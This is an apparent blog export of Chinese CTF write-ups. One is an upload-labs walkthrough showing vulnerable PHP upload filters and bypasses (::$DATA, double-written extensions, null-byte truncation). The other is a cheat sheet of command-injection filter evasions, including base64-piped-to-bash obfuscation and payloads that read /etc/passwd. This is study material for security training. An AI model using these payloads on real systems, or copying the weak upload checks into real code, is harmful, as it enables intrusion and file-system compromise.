class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答：-7"><a href="#解答：-7" class="headerlink" title="解答："></a>解答：</h3><p>.绕过，穿上<code>phpinfo.php.</code>，访问<code>php.</code>即可。</p>
<h2 id="level-9-DATA绕过"><a href="#level-9-DATA绕过" class="headerlink" title="level-9(::$DATA绕过)"></a>level-9(::$DATA绕过)</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码:"></a>源码:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答：-8"><a href="#解答：-8" class="headerlink" title="解答："></a>解答：</h3><p>可以发现没有去除字符串::$DATA</p>
<p>思路：同第六题一样，利用windows的特性，这里黑名单没有过滤<code>::$DATA</code>，因此上传<code>xx.php::$DATA</code>，上传成功后windows会自动去除<code>::$DATA</code></p>
<p>上传文件<code>.php::$DATA</code></p>
<h2 id="level-11-双写绕过"><a href="#level-11-双写绕过" class="headerlink" title="level-11(双写绕过)"></a>level-11(双写绕过)</h2><h3 id="源码：-7"><a href="#源码：-7" class="headerlink" title="源码："></a>源码：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>,<span class="string">&quot;ini&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = str_ireplace(<span class="variable">$deny_ext</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file_name</span>);</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;        </span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答：-9"><a href="#解答：-9" class="headerlink" title="解答："></a>解答：</h3><p>双写绕过</p>
<p>上传：<code>.pphphp</code>，进过黑名单过滤，会变成<code>.php</code></p>
<h2 id="level-12-白名单绕过之get型：-00"><a href="#level-12-白名单绕过之get型：-00" class="headerlink" title="level-12(白名单绕过之get型：%00)"></a>level-12(白名单绕过之get型：%00)</h2><h3 id="源码：-8"><a href="#源码：-8" class="headerlink" title="源码："></a>源码：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = substr(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],strrpos(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答"><a href="#解答" class="headerlink" title="解答:"></a>解答:</h3><p>此题对环境有特殊要求，目前无法复现，直接使用大佬的笔记内容</p>
<p>4月24日更新：复现完成。修改php.ini相应参数，已经PHP5.2.17</p>
<p>前提：该题需要magic_quotes_gpc=off、php版本要小于5.3.4，5.3.4及以上已经修复该问题</p>
<p>思路：因为$img_path是拼接而成，所以直接使用%00截断后面的内容，因此，先上传xx.jpg，再使用bp截断</p>
<p><img src="https://c.img.dasctf.com/images/20221220/1671531465726-00632d46-795a-48ec-ad77-0f13e3a70091.png" alt="img"></p>
<h2 id="level-13-白名单绕过之post型：0x00"><a href="#level-13-白名单绕过之post型：0x00" class="headerlink" title="level-13(白名单绕过之post型：0x00)"></a>level-13(白名单绕过之post型：0x00)</h2><h3 id="源码-1"><a href="#源码-1" class="headerlink" title="源码:"></a>源码:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = substr(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],strrpos(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传失败&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答：-10"><a href="#解答：-10" class="headerlink" title="解答："></a>解答：</h3><p>依旧是白名单绕过。post型，hex中0x00绕过。</p>
<p><img src="https://i.loli.net/2021/04/24/dknpOMe8iFHLTSl.png" alt="image-20210424110054827"></p>
<p>在hex中，找到<code>1.php</code>对应的十六进制数值，70、68、70，在70后插入一个字节 00 </p>
<p>直接访问阶段前的php文件即可。</p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF命令执行技巧总结</title>
    <url>/2021/04/21/CTF%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="CTF命令执行技巧总结"><a href="#CTF命令执行技巧总结" class="headerlink" title="CTF命令执行技巧总结"></a>CTF命令执行技巧总结</h1><p>对于近期CTF中命令执行的学习总结</p>
<span id="more"></span>
<h2 id="执行函数"><a href="#执行函数" class="headerlink" title="执行函数"></a>执行函数</h2><p>命令执行需要执行，贴出大佬关于代码执行和系统命令执行的讲解，不详细展开。</p>
<blockquote>
<p><a href="[https://wh0ale.github.io/2019/01/13/2019-1-13-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/](https://wh0ale.github.io/2019/01/13/2019-1-13-命令执行/">wh0ale博客：命令执行漏洞进阶详解</a>)</p>
</blockquote>
<h2 id="Linux绕过姿势"><a href="#Linux绕过姿势" class="headerlink" title="Linux绕过姿势"></a>Linux绕过姿势</h2><h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$IFS</span><br><span class="line">$IFS$1</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$9</span><br><span class="line">&lt;     比如cat&lt;a.tct:表示cat a.txt</span><br><span class="line">&lt;&gt;</span><br><span class="line">&#123;cat,flag.php&#125;  &#x2F;&#x2F;用逗号实现了空格功能，需要用&#123;&#125;括起来</span><br><span class="line">%20</span><br><span class="line">%09 &#x2F;&#x2F;php环境下</span><br></pre></td></tr></table></figure>
<h3 id="管道符"><a href="#管道符" class="headerlink" title="管道符"></a>管道符</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">;        &#x2F;&#x2F;前面和后面命令都要执行，无论前面真假</span><br><span class="line">|        &#x2F;&#x2F;直接执行后面的语句</span><br><span class="line">||       &#x2F;&#x2F;如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</span><br><span class="line">&amp;        &#x2F;&#x2F;前面和后面命令都要执行，无论前面真假</span><br><span class="line">&amp;&amp;       &#x2F;&#x2F;如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</span><br></pre></td></tr></table></figure>
<h3 id="命令拼接"><a href="#命令拼接" class="headerlink" title="命令拼接"></a>命令拼接</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a&#x3D;who</span><br><span class="line">b&#x3D;ami</span><br><span class="line">$a$b &#x2F;&#x2F;输出whoami</span><br><span class="line">q&#x3D;l; w&#x3D;s; e&#x3D;&quot; -al&quot;; $q$w$e   &#x2F;&#x2F;执行ls -al命令</span><br><span class="line">a&#x3D;c;b&#x3D;at;c&#x3D;fl;d&#x3D;ag; $a$b $c$d    &#x2F;&#x2F;cat flag</span><br></pre></td></tr></table></figure>
<h3 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;执行命令 cat flag</span><br><span class="line">&#x2F;???&#x2F;?[a]&#39;&#39;[t] ?&#39;&#39;?&#39;&#39;?&#39;&#39;?&#39;&#39;</span><br><span class="line">&#x2F;???&#x2F;?[a][t] ?&#39;&#39;?&#39;&#39;?&#39;&#39;?&#39;&#39;</span><br><span class="line">cat f*</span><br><span class="line">cat fl[abc]g         &#x2F;&#x2F;匹配[abc]中的任何一个</span><br><span class="line">cat f[a-z]ag         &#x2F;&#x2F;匹配a-z范围的任何字符</span><br><span class="line">利用正则:比如要读取etc&#x2F;passwd</span><br><span class="line">cat &#x2F;???&#x2F;??????</span><br><span class="line">cat &#x2F;???&#x2F;pass*</span><br><span class="line">cat &#x2F;etc$u&#x2F;passwd    &#x2F;&#x2F;变量u未定义，则为空</span><br></pre></td></tr></table></figure>
<h3 id="新姿势：Linux环境变量"><a href="#新姿势：Linux环境变量" class="headerlink" title="新姿势：Linux环境变量"></a>新姿势：Linux环境变量</h3><p>翻大佬博客时发现的姿势：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo $&#123;PATH&#125;            #&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin</span><br><span class="line">echo $&#123;PATH:1:9&#125;        #&#x2F;usr&#x2F;local</span><br><span class="line">$&#123;PATH:5:1&#125;$&#123;PATH:2:1&#125;  #拼接后是ls,执行命令</span><br></pre></td></tr></table></figure>
<p><img src="https://c.img.dasctf.com/images/20221220/1671531475350-95532a66-e878-49c6-ac42-7576b108b575.png" alt="image-20210421181825782"></p>
<h3 id="绕过ban位-常规操作"><a href="#绕过ban位-常规操作" class="headerlink" title="绕过ban位(常规操作)"></a>绕过ban位(常规操作)</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wh\o\ami    &#x2F;&#x2F;反斜线绕过</span><br><span class="line">who&quot;a&quot;mi    &#x2F;&#x2F;双引号绕过</span><br><span class="line">whoa&#39;m&#39;i    &#x2F;&#x2F;单引号绕过</span><br><span class="line">whoam&#96;&#96;i    &#x2F;&#x2F;反引号绕过</span><br><span class="line">echo d2hvYW1p|base64 -d|sh                 &#x2F;&#x2F;base64绕过,其中d2hvYW1p是whoami的base64编码</span><br><span class="line">echo d2hvYW1p|base64 -d|bash               &#x2F;&#x2F;base64绕过,其中d2hvYW1p是whoami的base64编码</span><br><span class="line">&#96;echo d2hvYW1p|base64 -d&#96;                  &#x2F;&#x2F;将其base64解码,然后用反引号来执行命令</span><br><span class="line">echo 77686F616D69 | xxd -r -p | bash       &#x2F;&#x2F;hex绕过,其中77686F616D69是whoami的hex编码</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;$*和$@，$x(x 代表 1-9),$&#123;x&#125;(x&gt;&#x3D;10) :比如ca$&#123;21&#125;t a.txt表示cat a.txt    </span><br><span class="line">&#x2F;&#x2F;在没有传入参数的情况下,这些特殊字符默认为空,如下:</span><br><span class="line">wh$1oami        &#x2F;&#x2F;不带中括号只能用一个字符在$后面</span><br><span class="line">who$@ami	</span><br><span class="line">whoa$*mi</span><br><span class="line">whoa$&#123;66&#125;mi     &#x2F;&#x2F;带中括号能用任意字符，但是字符内必须相同</span><br><span class="line">whoa$&#123;hh&#125;mi     &#x2F;&#x2F;不能带符号，会被解析成奇怪的东西</span><br></pre></td></tr></table></figure>
<p>正则 (假设/bin/cat: test: 是一个目录)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;???&#x2F;?[a][t] ?&#39;&#39;?&#39;&#39;?&#39;&#39;?&#39;&#39;</span><br><span class="line">&#x2F;???&#x2F;?at ????</span><br><span class="line">&#x2F;???&#x2F;?[a]&#39;&#39;[t] ?&#39;&#39;?&#39;&#39;?&#39;&#39;?&#39;&#39;</span><br></pre></td></tr></table></figure>
<p>$1、$2等和$@</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$#   &#x2F;&#x2F;是传给脚本的参数个数</span><br><span class="line">$0   &#x2F;&#x2F;是脚本本身的名字</span><br><span class="line">$1   &#x2F;&#x2F;是传递给该shell脚本的第一个参数</span><br><span class="line">$2   &#x2F;&#x2F;是传递给该shell脚本的第二个参数</span><br><span class="line">$@   &#x2F;&#x2F;是传给脚本的所有参数的列表</span><br><span class="line">$*   &#x2F;&#x2F;是以一个单字符串显示所有向脚本传递的参数，与位置变量不同，参数可超过9个</span><br><span class="line">$$   &#x2F;&#x2F;是脚本运行的当前进程ID号</span><br><span class="line">$?   &#x2F;&#x2F;是显示最后命令的退出状态，0表示没有错误，其他表示有错误</span><br></pre></td></tr></table></figure>
<h3 id="绕过ban位之cat"><a href="#绕过ban位之cat" class="headerlink" title="绕过ban位之cat"></a>绕过ban位之cat</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(1)more:一页一页的显示档案内容</span><br><span class="line">(2)less:与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页</span><br><span class="line">(3)head:查看头几行</span><br><span class="line">(4)tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</span><br><span class="line">(5)tail:查看尾几行</span><br><span class="line">(6)nl：显示的时候，顺便输出行号</span><br><span class="line">(7)od:以二进制的方式读取档案内容</span><br><span class="line">(8)vi:一种编辑器，这个也可以查看</span><br><span class="line">(9)vim:一种编辑器，这个也可以查看</span><br><span class="line">(10)sort:可以查看</span><br><span class="line">(11)uniq:可以查看</span><br><span class="line">(12)file -f:报错出具体内容</span><br><span class="line">grep</span><br><span class="line">1、在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令：</span><br><span class="line">grep test *file</span><br><span class="line">示例：grep &#123; *???    &#x2F;&#x2F;读flag.php</span><br></pre></td></tr></table></figure>
<h3 id="内敛执行绕过"><a href="#内敛执行绕过" class="headerlink" title="内敛执行绕过"></a>内敛执行绕过</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">666&#96;whoami&#96;666      &#x2F;&#x2F;bash: 666root666: command not found</span><br><span class="line">666&#96;\whoami&#96;666     &#x2F;&#x2F;bash: 666root666: command not found</span><br><span class="line">&#x2F;&#x2F;命令执行后的结果在2个666中间</span><br><span class="line"></span><br><span class="line">w&#96;f1hgb&#96;ho&#96;f1hgb&#96;am&#96;f1hgb&#96;i     &#x2F;&#x2F;反引号的作用是把括起来的字符当做命令执行</span><br><span class="line">w&#96;\f1hgb&#96;ho&#96;\f1hgb&#96;am&#96;\f1hgb&#96;i  &#x2F;&#x2F;这个反斜线作用就是平时的那种连接,反引号的作用是把括起来的字符当做命令执行</span><br><span class="line">wh$(f1hgb)oa$(f1hgb)mi          &#x2F;&#x2F;和上面的差不多,都说执行和拼接    </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="命令执行函数绕过（以system为例）"><a href="#命令执行函数绕过（以system为例）" class="headerlink" title="命令执行函数绕过（以system为例）"></a>命令执行函数绕过（以system为例）</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">system(&quot;cat &#x2F;etc&#x2F;passwd&quot;)</span><br><span class="line">&lt;&#x3D;&gt;</span><br><span class="line">&quot;\x73\x79\x73\x74\x65\x6d&quot;(&quot;cat &#x2F;etc&#x2F;passwd&quot;);</span><br><span class="line">&lt;&#x3D;&gt;</span><br><span class="line">(sy.(st).em)(&quot;cat &#x2F;etc&#x2F;passwd&quot;);</span><br><span class="line">&lt;&#x3D;&gt;还可以用注释方法绕过</span><br><span class="line">&quot;system&#x2F;*fthgb666*&#x2F;(&quot;cat &#x2F;etc&#x2F;passwd);&quot;</span><br><span class="line">&lt;&#x3D;&gt;</span><br><span class="line">&quot;system&#x2F;*fthgb666*&#x2F;(wh.&#x2F;*fthgb666*&#x2F;(oa)&#x2F;*fthgb666*&#x2F;.mi);&quot;</span><br><span class="line">&lt;&#x3D;&gt;</span><br><span class="line">&quot;(sy.&#x2F;*fthgb666*&#x2F;(st)&#x2F;*fthgb666*&#x2F;.em)&#x2F;*fthgb666*&#x2F;(wh.&#x2F;*fthgb666*&#x2F;(oa)&#x2F;*fthgb666*&#x2F;.mi);&quot;</span><br></pre></td></tr></table></figure>
<h3 id="简单地绕过长度限制"><a href="#简单地绕过长度限制" class="headerlink" title="简单地绕过长度限制"></a>简单地绕过长度限制</h3><h4 id="Linux中的-gt-符号和-gt-gt-符号"><a href="#Linux中的-gt-符号和-gt-gt-符号" class="headerlink" title="Linux中的&gt;符号和&gt;&gt;符号"></a>Linux中的&gt;符号和&gt;&gt;符号</h4><p>(1)通过<code>&gt;</code>来创建文件</p>
<p>(2)通过<code>&gt;</code>将命令结果存入文件中<br>使用<code>&gt;</code>命令会将原有文件内容覆盖，如果是存入不存在的文件名，那么就会新建该文件再存入</p>
<h4 id="Linux中命令换行"><a href="#Linux中命令换行" class="headerlink" title="Linux中命令换行"></a>Linux中命令换行</h4><p>在Linux中，当我们执行文件中的命令的时候，我们通过在没有写完的命令后面加<code>\</code>，可以将一条命令写在多行<br>比如一条命令<code>cat flag</code>可以如下表示</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">root@kali:~# <span class="title">ca</span>\</span></span><br><span class="line"><span class="function">&gt; <span class="title">t</span>\</span></span><br><span class="line"><span class="function">&gt;  <span class="title">fl</span>\</span></span><br><span class="line"><span class="function">&gt; <span class="title">ag</span></span></span><br><span class="line"><span class="function"><span class="title">this</span> <span class="title">is</span> <span class="title">your</span> <span class="title">flag</span></span></span><br></pre></td></tr></table></figure>
<p>既然可以这样那我们是不是可以在某些限制长度的情况下执行命令，将命令一条一条输入一个文本中再执行，尝试一下</p>
